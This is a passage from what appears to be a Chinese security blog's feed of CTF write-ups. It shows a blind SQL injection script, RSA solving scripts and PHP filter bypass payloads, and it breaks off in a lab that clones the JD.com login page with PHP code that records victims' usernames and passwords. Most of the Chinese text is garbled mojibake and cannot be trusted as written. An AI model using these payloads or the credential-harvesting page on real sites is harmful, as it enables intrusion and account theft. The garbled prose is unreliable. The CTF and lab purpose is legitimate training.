class="hljs-symbol">%AF</span><span class="hljs-symbol">%3</span>F<span class="hljs-symbol">%98</span><span class="hljs-symbol">%CD</span><span class="hljs-symbol">%A4</span><span class="hljs-symbol">%BCF</span><span class="hljs-symbol">%29</span><span class="hljs-symbol">%B1</span></code></pre></div>

<p><strong>è¿˜æœ‰ä¸€ä¸ªå¾ˆå‘çš„åœ°æ–¹ï¼Œhackbarä¸Šä¼ æ—¶æ²¡æœ‰ä½œç”¨ï¼Œåªèƒ½ç”¨bpæŠ“åŒ…ä¸Šä¼ ï¼ŒæŠ“åŒ…æ—¶æ³¨æ„å…ˆéšä¾¿postä¸€ä¸ªå‚æ•°ï¼Œè¿™æ ·æ•°æ®åŒ…æ‰æ˜¯postæ–¹å¼ï¼Œç„¶åè´´ä¸Šä¸Šé¢çš„ä¸¤ä¸ªå‚æ•°å€¼</strong></p>
<h3 id="babysql2"><a href="#babysql2" class="headerlink" title="babysql2"></a>babysql2</h3><p>æŸ¥è¯¢è¯­å¥ä¸ç¬¬ä¸€ä¸ªæ³¨å…¥ç›¸åŒï¼Œä½†æ˜¯è¿™é¢˜ä¸ç»™å›æ˜¾ï¼ŒçŒœæµ‹æ˜¯ç›²æ³¨ï¼Œä½†æ˜¯å¥½åƒè¿‡æ»¤äº†æ›´å¤šçš„å…³é”®å­—</p>
<p>åœ¨1çš„åŸºç¡€ä¸Šé¢å¤–è¿‡æ»¤äº† â€˜ ï¼Œ ascii ï¼Œ mid ï¼Œ substr ï¼Œå…³é—­äº†æŠ¥é”™å›æ˜¾å’Œè¾“å‡ºï¼Œä½†æ˜¯æŸ¥è¯¢æˆåŠŸæˆ–è€…å¤±è´¥ å›æ˜¾ä¸åŒï¼Œå› æ­¤å¯ä»¥boolæ³¨å…¥ã€‚</p>
<div class="hljs"><pre><code class="hljs python">url = <span class="hljs-string">'http://219.219.61.234:20004/'</span>
password = <span class="hljs-string">""</span>
string = [ord(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz!_@-&#125;&#123;'</span>]<span class="hljs-comment">#å°†å­—æ¯è½¬æ¢ä¸ºasciiç </span>
a = <span class="hljs-string">'0x5e'</span>   <span class="hljs-comment"># '\'çš„asciiç å€¼</span>
<span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>):
    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> string:
        <span class="hljs-keyword">if</span> (hex(j)[<span class="hljs-number">2</span>:]==<span class="hljs-string">'7b'</span>):
            str=<span class="hljs-string">'5c'</span>+hex(j)[<span class="hljs-number">2</span>:]  <span class="hljs-comment">#å°†'&#123;'è½¬ä¹‰ï¼Œ</span>
        <span class="hljs-keyword">else</span>:
            str=hex(j)[<span class="hljs-number">2</span>:]

        time.sleep(<span class="hljs-number">0.1</span>)

        payload  =<span class="hljs-string">"||/**/(select/**/password/**/from/**/users/**/limit/**/9,1)/**/regexp/**/binary/**/%s/**/#"</span> % (a + str)
<span class="hljs-comment"># ç›²æ³¨çš„æŸ¥è¯¢è¯­å¥ regexp binary æ˜¯åŒºåˆ†å¤§å°å†™çš„æ­£åˆ™åŒ¹é…</span>
        data =&#123;<span class="hljs-string">"username"</span>:<span class="hljs-string">"\\"</span>,<span class="hljs-string">"password"</span>:payload&#125;
        print(data)
        r = requests.post(url,data=data) <span class="hljs-comment">#è®¿é—®</span>
        <span class="hljs-keyword">if</span> <span class="hljs-string">"success"</span> <span class="hljs-keyword">in</span> r.text:
            <span class="hljs-comment">#print(r.text)</span>
            password+=chr(j)
            print(password)
            a+=str      		
            <span class="hljs-keyword">break</span>
    <span class="hljs-keyword">if</span> <span class="hljs-string">"wrong"</span> <span class="hljs-keyword">in</span> r.text:
        <span class="hljs-keyword">break</span>
print(password)</code></pre></div>

<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="å¹¼å„¿å›­çš„å¯†ç é¢˜"><a href="#å¹¼å„¿å›­çš„å¯†ç é¢˜" class="headerlink" title="å¹¼å„¿å›­çš„å¯†ç é¢˜"></a>å¹¼å„¿å›­çš„å¯†ç é¢˜</h3><p>å…ˆè½¬æ¢ä¸ºåè¿›åˆ¶ååœ¨çº¿åˆ†è§£åç›´æ¥ä¸Šè„šæœ¬</p>
<p><a href="http://www.factordb.com/" target="_blank" rel="noopener">http://www.factordb.com/</a> åœ¨çº¿åˆ†è§£ç½‘å€</p>
<div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">import</span> binascii
<span class="hljs-keyword">import</span> sys
sys.setrecursionlimit(<span class="hljs-number">1000000</span>)
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ByteToHex</span><span class="hljs-params">(bins)</span>:</span>
  <span class="hljs-keyword">return</span> <span class="hljs-string">''</span>.join([<span class="hljs-string">"%02X"</span> % x <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> bins]).strip()
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">n2s</span><span class="hljs-params">(num)</span>:</span>
  t = hex(num)[<span class="hljs-number">2</span>:<span class="hljs-number">-1</span>]  <span class="hljs-comment"># python</span>
  <span class="hljs-keyword">if</span> len(t) % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>:
    t = <span class="hljs-string">'0'</span> + t
  \<span class="hljs-comment">#print(t)</span>
  <span class="hljs-keyword">return</span>(binascii.a2b_hex(t).decode(<span class="hljs-string">'latin1'</span>))
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">egcd</span><span class="hljs-params">(a, b)</span>:</span>
  <span class="hljs-keyword">if</span> a == <span class="hljs-number">0</span>:
    <span class="hljs-keyword">return</span> (b, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>)
  <span class="hljs-keyword">else</span>:
    g, y, x = egcd(b % a, a)
    <span class="hljs-keyword">return</span> (g, x - (b // a) * y, y)
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">modinv</span><span class="hljs-params">(a, m)</span>:</span>
  g, x, y = egcd(a, m)
  <span class="hljs-keyword">if</span> g != <span class="hljs-number">1</span>:
    print(<span class="hljs-string">'modular inverse does not exist'</span>)
    <span class="hljs-keyword">return</span> <span class="hljs-string">'null'</span>
  <span class="hljs-keyword">else</span>:
    <span class="hljs-keyword">return</span> x % m
c = <span class="hljs-number">40448992051548719008529549070468060415257485938698092782029814901918646701101</span>
p = <span class="hljs-number">328413456989577256301798468872388310877</span>
q = <span class="hljs-number">324350545929838254331191385863847627003</span>
e = <span class="hljs-number">65537</span>
n = p * q
d = modinv(e, (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>))
m = pow(c, d, n)

<span class="hljs-keyword">print</span> (m)</code></pre></div>



<p>æ•°å­—è½¬å­—ç¬¦çš„è„šæœ¬</p>
<div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">import</span> binascii
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">n2s</span><span class="hljs-params">(num)</span>:</span>
  t = hex(num)[<span class="hljs-number">2</span>:<span class="hljs-number">-1</span>]  <span class="hljs-comment"># python</span>
  <span class="hljs-keyword">if</span> len(t) % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>:
    t = <span class="hljs-string">'0'</span> + t
  \<span class="hljs-comment">#print(t)</span>
  <span class="hljs-keyword">return</span>(binascii.a2b_hex(t).decode(<span class="hljs-string">'latin1'</span>))
print(n2s(a)) <span class="hljs-comment">#aä¸ºä¸Šä¸€ä¸ªè„šæœ¬è®¡ç®—å‡ºçš„æ•°å­—</span></code></pre></div>



<h3 id="å°å­¦ç”Ÿçš„å¯†ç é¢˜"><a href="#å°å­¦ç”Ÿçš„å¯†ç é¢˜" class="headerlink" title="å°å­¦ç”Ÿçš„å¯†ç é¢˜"></a>å°å­¦ç”Ÿçš„å¯†ç é¢˜</h3><h3 id="åˆä¸­ç”Ÿçš„å¯†ç é¢˜"><a href="#åˆä¸­ç”Ÿçš„å¯†ç é¢˜" class="headerlink" title="åˆä¸­ç”Ÿçš„å¯†ç é¢˜"></a>åˆä¸­ç”Ÿçš„å¯†ç é¢˜</h3><p>æ¬¡é¢˜ä¸å¹¼å„¿å›­çš„ç±»ä¼¼ï¼Œä½†æ˜¯ç”±äºnè¿‡å¤§ï¼Œè¯•äº†å¾ˆå¤šå·¥å…·éƒ½æ— æ³•åˆ†è§£ã€‚</p>
<p>ä»”ç»†çœ‹é¢˜ä¼šå‘ç°è¿™é¢˜çš„æ¡ä»¶ç»™çš„æ¯”è¾ƒå¤š,çŸ¥é“p-q</p>
<p>äºæ˜¯æƒ³åˆ°äº†<code>(p+q)^2-(p-q)^2=4pq=4n</code>ï¼Œå¯ä»¥ç®—å‡ºp+q,ä¹‹åè§£å‡ºp,q</p>
<div class="hljs"><pre><code class="hljs python">ç®—p,qçš„è„šæœ¬
<span class="hljs-comment"># -*- coding = utf - 8 -*-</span>
<span class="hljs-comment">#@Time : 2020/9/24 21:55</span>
<span class="hljs-comment">#@Author : sunzy</span>
<span class="hljs-comment">#@File : su.py</span>
<span class="hljs-keyword">import</span> gmpy2
n = <span class="hljs-number">848636981711330203910533960833570455347986345690792054016750216327432282027653737545502731789145875082064910377585125307004316982829408169391535303284775605083341204318559328114199464933306718077358184455649201353500348066849356092072732731595459583112558025395897556853371526959018489282157258240657926428930442774978485014507505784476690845099227369478496626645851076679385883251594929952035661085961598388544126711902983065521128172978259778754970695037278639045266353840536697343675638366506183715240679610094431082173271579344392346412454309134164388560354168918421706979410826758333952277436780339926907679282601846125790204266958409253210507301575619878252146515542791259716201124558373197816421305046774535734189567481599690381428371580696486054135486182509762880877363356256116336930055483318415453999460475103494980748558993889459677374574910745242385711928489669790527969454801533682757508950065697410745338257289717598141031203566419840587221470340637486034911686587695890702753064441476917845870069997649577034149354150224132983093069444866234262542625997399303875938451386377357399819123134018307163799151847997740448433278364764592560369020005024859119937315831252233159882960532854116233641920659786799836075681746397</span>
p_sub_q = <span class="hljs-number">-3052070064538177039316204197190587772604720575847063904632214287646067455053231054471310322671549035272267675314294983896730810628462303176753740499536650509067032550999649642312183001467325569057721784454105443122299599368088210370664912463545058026638059476152117310712548608873763578306375998350729040793659145108802752313856984121444358377361896069243965149432626400631035486457915394853541729904150184876824863707417199152978276518660302136096681722191666079256269268999389217644896376343059852127338281844120448782198891495913902938174313438531667749920307775936355947018946620720978288405012504885451732231636</span>
x = (<span class="hljs-number">4</span>*n+p_sub_q*p_sub_q)

gmpy2.mpz(x)
<span class="hljs-comment">#p_add_q = gmpy2.iroot(x, 2)</span>
p_add_q = <span class="hljs-number">58342634998122692674032973234620896020471694068399847453520741898744437026570834277134765347908181270295928479896424327076716339778780713227054670754114006755614107059128760453507315091935855120450792252194791430498450216725579392051311373554303029775579999984765816108626868293630358812164765119470747267373609041885833415440716244492402495944064255436477147868576748300862501670473856373437423326957856588782039066794320093570665076624361151742737113922376038763268964187459938086360191752544167623804772397201519904950840301831333585995087985697059748872751988663760065650743406672809203915981347563824970092886078</span>
<span class="hljs-comment"># print(p_add_q)</span>
y=(p_sub_q+p_add_q)
z=(p_add_q-p_sub_q)

print(y&gt;&gt;<span class="hljs-number">1</span>)
print(z&gt;&gt;<span class="hljs-number">1</span>)</code></pre></div>

<p>çŸ¥é“p,qåï¼Œæ­¤é¢˜çš„è§£æ³•ä¸å¹¼å„¿å›­çš„è§£æ³•ç›¸åŒ</p>
<p>èœé¸¡åªä¼šè¿™ä¹ˆå¤šã€‚ã€‚ã€‚</p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>sql</tag>
        <tag>æ–‡ä»¶åŒ…å«</tag>
        <tag>rsa</tag>
      </tags>
  </entry>
  <entry>
    <title>bugkuä»£ç å®¡è®¡</title>
    <url>/2020/09/14/decode/</url>
    <content><![CDATA[<h1 id="ç®€å•çš„ä»£ç å®¡è®¡"><a href="#ç®€å•çš„ä»£ç å®¡è®¡" class="headerlink" title="ç®€å•çš„ä»£ç å®¡è®¡"></a>ç®€å•çš„ä»£ç å®¡è®¡</h1><a id="more"></a>

<h2 id="extractå˜é‡è¦†ç›–"><a href="#extractå˜é‡è¦†ç›–" class="headerlink" title="extractå˜é‡è¦†ç›–"></a>extractå˜é‡è¦†ç›–</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
$flag=<span class="hljs-string">'xxx'</span>;  <span class="hljs-comment">//æ–°å»ºå˜é‡</span>
extract($_GET);  <span class="hljs-comment">// å˜é‡è¦†ç›–</span>
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($shiyan))   <span class="hljs-comment">//åˆ¤æ–­æ˜¯å¦å­˜åœ¨</span>
&#123;
$content=trim(file_get_contents($flag));<span class="hljs-comment">//æŠŠæ–‡ä»¶è¯»å…¥å­—ç¬¦ä¸²</span>
<span class="hljs-keyword">if</span>($shiyan==$content)  <span class="hljs-comment">//åˆ¤æ–­ä¸¤å˜é‡æ˜¯å¦ç›¸ç­‰</span>
&#123;
<span class="hljs-keyword">echo</span><span class="hljs-string">'flag&#123;xxx&#125;'</span>;
&#125;
<span class="hljs-keyword">else</span>
&#123;
<span class="hljs-keyword">echo</span><span class="hljs-string">'Oh.no'</span>;
&#125;
&#125;
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>extract()å‡½æ•°</p>
<p><img src="/2020/09/14/decode/extrct.png" srcset="/img/loading.gif" alt></p>
<p><strong>isset()å‡½æ•°</strong><br>isset() å‡½æ•°ç”¨äºæ£€æµ‹å˜é‡æ˜¯å¦å·²è®¾ç½®å¹¶ä¸”é NULLã€‚</p>
<p>å¦‚æœå·²ç»ä½¿ç”¨ unset() é‡Šæ”¾äº†ä¸€ä¸ªå˜é‡ä¹‹åï¼Œå†é€šè¿‡ isset() åˆ¤æ–­å°†è¿”å› FALSEã€‚</p>
<p>è‹¥ä½¿ç”¨ isset() æµ‹è¯•ä¸€ä¸ªè¢«è®¾ç½®æˆ NULL çš„å˜é‡ï¼Œå°†è¿”å› FALSEã€‚</p>
<p>åŒæ—¶è¦æ³¨æ„çš„æ˜¯ null å­—ç¬¦ï¼ˆâ€\0â€ï¼‰å¹¶ä¸ç­‰åŒäº PHP çš„ NULL å¸¸é‡ã€‚</p>
<p>Tips:isset()å‡½æ•°å¦‚æœä¸€æ¬¡ä¼ å…¥å¤šä¸ªå‚æ•°ï¼Œåªæœ‰å‚æ•°å…¨è¢«è®¾ç½®ä¸”éç©ºçš„æƒ…å†µä¸‹æ‰è¿”å›TRUEï¼Œisset()å‡½æ•°å¯¹æ•°ç»„ä¸­çš„å…ƒç´ åŒæ ·é€‚ç”¨ã€‚</p>
<p>file_get_contents() </p>
<p><img src="/2020/09/14/decode/file.png" srcset="/img/loading.gif" alt></p>
<p>å˜é‡è¦†ç›–çš„æ„æ€å°±æ˜¯è®©è‡ªå·±ä¸Šä¼ çš„å˜é‡å€¼è¦†ç›–åŸæœ‰çš„å˜é‡å€¼</p>
<p>è¿™é‡Œå€¼å¾—æ³¨æ„çš„æ˜¯ <code>$shiyan</code>==<code>$content</code>,è€Œcontentçš„å€¼æ¥è‡ªäºå‡½æ•°è‡ªå·±å»ºçš„$flagå˜é‡ï¼Œæ‰€ä»¥è¿™é¢˜ç›®çš„å˜é‡è¦†ç›–å®é™…æ˜¯è¦†ç›–$flagçš„å€¼ï¼Œè®©flagçš„å€¼å’Œshiyançš„å€¼ç›¸åŒ</p>
<p>å¯ä»¥ç”¨ç©ºå€¼çš„æ–¹æ³•ä½¿äºŒè€…æƒ³ç­‰å³</p>
<p><code>?shiyan=&amp;flag=</code></p>
<h2 id="strcmpæ¯”è¾ƒå­—ç¬¦ä¸²"><a href="#strcmpæ¯”è¾ƒå­—ç¬¦ä¸²" class="headerlink" title="strcmpæ¯”è¾ƒå­—ç¬¦ä¸²"></a>strcmpæ¯”è¾ƒå­—ç¬¦ä¸²</h2><p><a href="http://123.206.87.240:9009/6.php" target="_blank" rel="noopener">http://123.206.87.240:9009/6.php</a></p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
$flag = <span class="hljs-string">"flag&#123;xxxxx&#125;"</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'a'</span>])) &#123;
<span class="hljs-keyword">if</span> (strcmp($_GET[<span class="hljs-string">'a'</span>], $flag) == <span class="hljs-number">0</span>) <span class="hljs-comment">//å¦‚æœ str1 å°äº str2 è¿”å› &lt; 0ï¼› å¦‚æœ str1å¤§äº str2è¿”å› &gt; 0ï¼›å¦‚æœä¸¤è€…ç›¸ç­‰ï¼Œè¿”å› 0ã€‚</span>
<span class="hljs-comment">//æ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²ï¼ˆåŒºåˆ†å¤§å°å†™ï¼‰</span>
<span class="hljs-keyword">die</span>(<span class="hljs-string">'Flag: '</span>.$flag);
<span class="hljs-keyword">else</span>
<span class="hljs-keyword">print</span> <span class="hljs-string">'No'</span>;
&#125;
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>é¢˜ç›®ç»™çš„æ³¨é‡Šå¾ˆæ¸…æ¥šçš„ç»™å‡ºäº†è·å¾—flagçš„æ¡ä»¶ã€‚ã€‚ã€‚</p>
<p>å…ˆäº†è§£ä¸€ä¸‹</p>
<p><img src="/2020/09/14/decode/strcmp.png" srcset="/img/loading.gif" alt></p>
<p>strcmp()çš„ä¸¤ä¸ªå‚æ•°éƒ½å¿…é¡»æ˜¯å­—ç¬¦ä¸²ç±»å‹çš„ï¼Œä½†æ˜¯å¦‚æœä¼ é€’ä¸€ä¸ªéå­—ç¬¦ç©¿ç±»å‹çš„å‚æ•°è¿›å»ï¼Œä¾‹å¦‚æ•°ç»„ï¼Œåˆ™å‡½æ•°å°±ä¼šæŠ¥é”™ï¼Œå…¶è¿”å›å€¼å°±ä¸º0ã€‚æ»¡è¶³ <code>if (strcmp($_GET[&#39;a&#39;], $flag) == 0)</code>  å³å¯è·å¾—flag</p>
<p><strong>url:<code>http://123.206.87.240:9009/6.php?a[]=</code></strong></p>
<h2 id="urldecodeäºŒæ¬¡ç¼–ç ç»•è¿‡"><a href="#urldecodeäºŒæ¬¡ç¼–ç ç»•è¿‡" class="headerlink" title="urldecodeäºŒæ¬¡ç¼–ç ç»•è¿‡"></a>urldecodeäºŒæ¬¡ç¼–ç ç»•è¿‡</h2><p>é¢˜ç›®è¯´çš„å¾ˆæ¸…æ¥šäº†ï¼ŒäºŒæ¬¡ç¼–ç ç»•è¿‡</p>
<div class="hljs"><pre><code class="hljs bash"><span class="hljs-keyword">if</span>(eregi(<span class="hljs-string">"hackerDJ"</span>,<span class="hljs-variable">$_GET</span>[id])) &#123;
<span class="hljs-built_in">echo</span>(<span class="hljs-string">"</span>
<span class="hljs-string"></span>
<span class="hljs-string">not allowed!</span>
<span class="hljs-string"></span>
<span class="hljs-string">"</span>);</code></pre></div>



<blockquote>
<p>PHP å‡½æ•° eregi()</p>
<p>è¯­æ³•<br> int eregi(string pattern, string string, [array regs]);<br> å®šä¹‰å’Œç”¨æ³•<br> eregi()å‡½æ•°åœ¨ä¸€ä¸ªå­—ç¬¦ä¸²æœç´¢æŒ‡å®šçš„æ¨¡å¼çš„å­—ç¬¦ä¸²ã€‚æœç´¢ä¸åŒºåˆ†å¤§å°å†™ã€‚Eregi()å¯ä»¥ç‰¹åˆ«æœ‰ç”¨çš„æ£€æŸ¥æœ‰æ•ˆæ€§å­—ç¬¦ä¸²,å¦‚å¯†ç ã€‚</p>
<p>å¯é€‰çš„è¾“å…¥å‚æ•°è§„åˆ™åŒ…å«ä¸€ä¸ªæ•°ç»„çš„æ‰€æœ‰åŒ¹é…è¡¨è¾¾å¼,ä»–ä»¬è¢«æ­£åˆ™è¡¨è¾¾å¼çš„æ‹¬å·åˆ†ç»„ã€‚</p>
<p>è¿”å›å€¼<br> å¦‚æœåŒ¹é…æˆåŠŸè¿”å›true,å¦åˆ™,åˆ™è¿”å›false</p>
</blockquote>
<p>è¿™é‡Œè¿›è¡Œäº†è¿‡æ»¤ï¼Œä¼ çš„å€¼ä¸èƒ½ä¸ºhackerDJ</p>
<div class="hljs"><pre><code class="hljs php">
$_GET[id] = urldecode($_GET[id]);
<span class="hljs-keyword">if</span>($_GET[id] == <span class="hljs-string">"hackerDJ"</span>) <span class="hljs-comment">//è¦ç¼–ç çš„å­—ç¬¦ä¸²hackerDJ</span></code></pre></div>

<p>GETä¼šæäº¤æ—¶è¿›è¡Œä¸€æ¬¡urlencode</p>
<p>urldecode()äºurlencode()æ˜¯ä¸€å¯¹æƒ³åä½œç”¨çš„å‡½æ•°ï¼Œä¸€ä¸ªè§£ç ä¸€ä¸ªç¼–ç ã€‚</p>
<p><code>$_GET[id] = urldecode($_GET[id])</code>     urldecodeåçš„<strong>$_GET[id]</strong> å¤åˆ¶ç»™è‡ªå·±ç­‰äºhackerDJ</p>
<p>æ‰€ä»¥å¯¹hackerDJ è¿›è¡Œä¸¤æ¬¡urlencode, ä¸ºäº†ç»•è¿‡è¿‡æ»¤ï¼›è¿›è¡Œä¸€æ¬¡urldecodeåå…¶å€¼å’ŒhackerDJç›¸ç­‰ï¼Œå¾—åˆ°flag</p>
<p><code>?id=%25%36%38%25%36%31%25%36%33%25%36%42%25%36%35%25%37%32%25%34%34%25%34%41</code></p>
<h2 id="md5-å‡½æ•°"><a href="#md5-å‡½æ•°" class="headerlink" title="md5()å‡½æ•°"></a>md5()å‡½æ•°</h2><p>ä¹‹å‰å†™è¿‡</p>
<h2 id="æ•°ç»„è¿”å›NULLç»•è¿‡"><a href="#æ•°ç»„è¿”å›NULLç»•è¿‡" class="headerlink" title="æ•°ç»„è¿”å›NULLç»•è¿‡"></a>æ•°ç»„è¿”å›NULLç»•è¿‡</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
$flag = <span class="hljs-string">"flag"</span>;

<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> ($_GET[<span class="hljs-string">'password'</span>])) &#123;
<span class="hljs-keyword">if</span> (ereg (<span class="hljs-string">"^[a-zA-Z0-9]+$"</span>, $_GET[<span class="hljs-string">'password'</span>]) === <span class="hljs-keyword">FALSE</span>) <span class="hljs-comment">//è¿›è¡Œè¿‡æ»¤ï¼Œpasswordå¿…é¡»åŒ…å«å­—æ¯å’Œæ•°å­—</span>
<span class="hljs-keyword">echo</span> <span class="hljs-string">'You password must be alphanumeric'</span>;
<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (strpos ($_GET[<span class="hljs-string">'password'</span>], <span class="hljs-string">'--'</span>) !== <span class="hljs-keyword">FALSE</span>)
<span class="hljs-keyword">die</span>(<span class="hljs-string">'Flag: '</span> . $flag);
<span class="hljs-keyword">else</span>
<span class="hljs-keyword">echo</span> <span class="hljs-string">'Invalid password'</span>;
&#125;
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>æç¤ºæ˜¯æ•°ç»„è¿”å›NULL</p>
<p>ç›´æ¥å°è¯•æäº¤<code>?password[]=</code>ï¼Œflagå°±å‡ºæ¥äº†</p>
<p>äº†è§£ä¸€ä¸‹åŸç†ï¼Œ</p>
<blockquote>
<p>ä»£ç ç›¸å…³çŸ¥è¯†ç‚¹é“¾æ¥å¦‚ä¸‹ï¼š</p>
<p>issetå‡½æ•°ï¼š<a href="http://php.net/manual/zh/function.isset.php" target="_blank" rel="noopener">http://php.net/manual/zh/function.isset.php</a></p>
<p>eregå‡½æ•°ï¼š<a href="http://www.php.net/manual/zh/function.ereg.php" target="_blank" rel="noopener">http://www.php.net/manual/zh/function.ereg.php</a></p>
<p>strposå‡½æ•°ï¼š<a href="http://www.w3school.com.cn/php/func_string_strpos.asp" target="_blank" rel="noopener">http://www.w3school.com.cn/php/func_string_strpos.asp</a></p>
<p>â€œ[A-Za-z0-9]â€<br>æ–¹æ‹¬å·è¡¨ç¤ºå­—ç¬¦é›†ï¼Œ[A-Za-z0-9]åŒ¹é…å¤§å°å†™å­—æ¯å’Œæ•°å­—å…¶ä¸­ä¸€ä¸ªå­—ç¬¦</p>
<p>â€œ^[A-Za-z0-9]$â€<br>^è¡¨ç¤ºå­—ç¬¦ä¸²å¼€å§‹ï¼Œ$è¡¨ç¤ºå­—ç¬¦ä¸²ç»“æŸ ï¼Œè¿™ä¸ªåŒ¹é…åªæœ‰ä¸€ä¸ªå¤§å°å†™å­—æ¯å’Œæ•°å­—å­—ç¬¦çš„å­—ç¬¦ä¸²</p>
<p>â€œ^[A-Za-z0-9]+$â€<br>+å·è¡¨ç¤ºé‡å¤1åˆ°å¤šæ¬¡ï¼ŒåŒ¹é…ç”±å¤šä¸ªæ•°å­—å¤§å°å­—æ¯ç»„æˆçš„å­—ç¬¦ä¸²</p>
</blockquote>
<p><img src="/2020/09/14/decode/ereg.png" srcset="/img/loading.gif" alt="ereg"></p>
<p><img src="/2020/09/14/decode/strpos.png" srcset="/img/loading.gif" alt="strpos"></p>
<p>å€¼å¾—æ³¨æ„çš„æ˜¯è¿™ä¸¤ä¸ªå‡½æ•°èƒ½å¤„ç†çš„å‚æ•°éƒ½æ˜¯stringç±»å‹</p>
<div class="hljs"><pre><code class="hljs php">eregåªèƒ½å¤„ç†å­—ç¬¦ï¼Œrå¦‚æœæ•°ç»„ï¼Œåˆ™è¿”å›çš„æ˜¯<span class="hljs-keyword">null</span>ï¼Œä¸‰ä¸ªç­‰å·çš„æ—¶å€™ä¸ä¼šè¿›è¡Œç±»å‹è½¬æ¢ã€‚æ‰€ä»¥<span class="hljs-keyword">null</span>ä¸ç­‰äº<span class="hljs-keyword">false</span>ã€‚

strposçš„å‚æ•°åŒæ ·ä¸èƒ½å¤Ÿæ˜¯æ•°ç»„ï¼Œæ‰€ä»¥è¿”å›çš„ä¾æ—§æ˜¯<span class="hljs-keyword">null</span>ï¼Œ<span class="hljs-keyword">null</span>ä¸ç­‰äº<span class="hljs-keyword">false</span>ä¹Ÿæ˜¯æ­£ç¡®ã€‚</code></pre></div>

<p>æ•…?password[]=å¯ä»¥ç»•è¿‡ã€‚</p>
<p>ä½†æ˜¯è¿˜æœ‰ä¸€ç§ä¸º%00æˆªæ–­</p>
<p><code>?password=d%00--</code></p>
]]></content>
      <categories>
        <category>ä»£ç å®¡è®¡</category>
      </categories>
      <tags>
        <tag>å˜é‡è¦†ç›–</tag>
        <tag>å‡½æ•°æ¼æ´</tag>
        <tag>ç»•è¿‡</tag>
      </tags>
  </entry>
  <entry>
    <title>diaoyu</title>
    <url>/2020/07/18/diaoyu/</url>
    <content><![CDATA[<h1 id="DNSæ¬ºéª—ã€ARPæ”»å‡»åŠé’“é±¼ç½‘ç«™åˆ¶ä½œ"><a href="#DNSæ¬ºéª—ã€ARPæ”»å‡»åŠé’“é±¼ç½‘ç«™åˆ¶ä½œ" class="headerlink" title="DNSæ¬ºéª—ã€ARPæ”»å‡»åŠé’“é±¼ç½‘ç«™åˆ¶ä½œ"></a>DNSæ¬ºéª—ã€ARPæ”»å‡»åŠé’“é±¼ç½‘ç«™åˆ¶ä½œ</h1><a id="more"></a>
<p>1.å®éªŒç›®çš„<br>è·å–ç™»å½•jdç½‘é¡µçš„ç”¨æˆ·åå’Œå¯†ç <br>2.å®éªŒä¸»æœº<br>ä¸€å°kali,ä¸¤å°win2003,å…¶ä¸­ä¸€å°ä¸ºå®¢æˆ·æœºï¼Œä¸€å°ä¸ºæœåŠ¡å™¨ï¼Œkaliä½œä¸ºæ”»å‡»è€…<br>3.å®éªŒææ–™<br>äº¬ä¸œç™»å½•ç½‘é¡µåŠå…¶æ‰€æœ‰å›¾ç‰‡ï¼ˆæµè§ˆå™¨è®¿é—®<a href="https://passport.jd.com/new/login.aspx?ReturnUrl=https%3A%2F%2Fwww.jd.com%2F" target="_blank" rel="noopener">https://passport.jd.com/new/login.aspx?ReturnUrl=https%3A%2F%2Fwww.jd.com%2F</a> ä¹‹åä¿å­˜ç½‘é¡µå³å¯ï¼‰<br><img src="/2020/07/18/diaoyu/9.png" srcset="/img/loading.gif" alt><br>ä¿®æ”¹index.htmlä¸­çš„å†…å®¹<br><img src="/2020/07/18/diaoyu/10.png" srcset="/img/loading.gif" alt><br>error.phpä¸­çš„å†…å®¹å¦‚ä¸‹<br>å…³é”®ä»£ç ï¼ˆç”¨äºä¿å­˜ç”¨æˆ·åå’Œå¯†ç ä»¥åŠè¿·æƒ‘ç”¨æˆ·ï¼‰</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
$nam = stripslashes($_POST[<span class="hljs-string">'name'</span>]); <span class="hljs-comment">//name æ˜¯ç”±ç½‘é¡µçš„è¡¨å•ä¿¡æ¯å†³å®šï¼Œä¸åŒçš„ç½‘é¡µå¯¹åº”ä¸åŒçš„å†…å®¹ï¼Œè¿™ä¸€ç‚¹å¾ˆé‡è¦</span>
$pas = stripslashes($_POST[<span class="hljs-string">'pass'</span>]);<span class="hljs-comment">//passä¹Ÿä¸€æ ·</span>
$content = <span class="hljs-string">"æ‚¨å·²æ•è·äº¬ä¸œè´¦å·åŠå¯†ç 1ä¸ªï¼š"</span> . <span class="hljs-string">" ç”¨æˆ·å "</span> . $nam . <span class="hljs-string">" å¯†ç  "</span> . $pas;   <span class="hljs-comment">//ä¿å­˜æ•è·çš„ç”¨æˆ·åå’Œå¯†ç </span>
$filed = @fopen(<span class="hljs-string">"1.txt"</span>, <span class="hljs-string">"a+"</span>);   <span class="hljs-comment">//æ‰“å¼€1.txt</span>
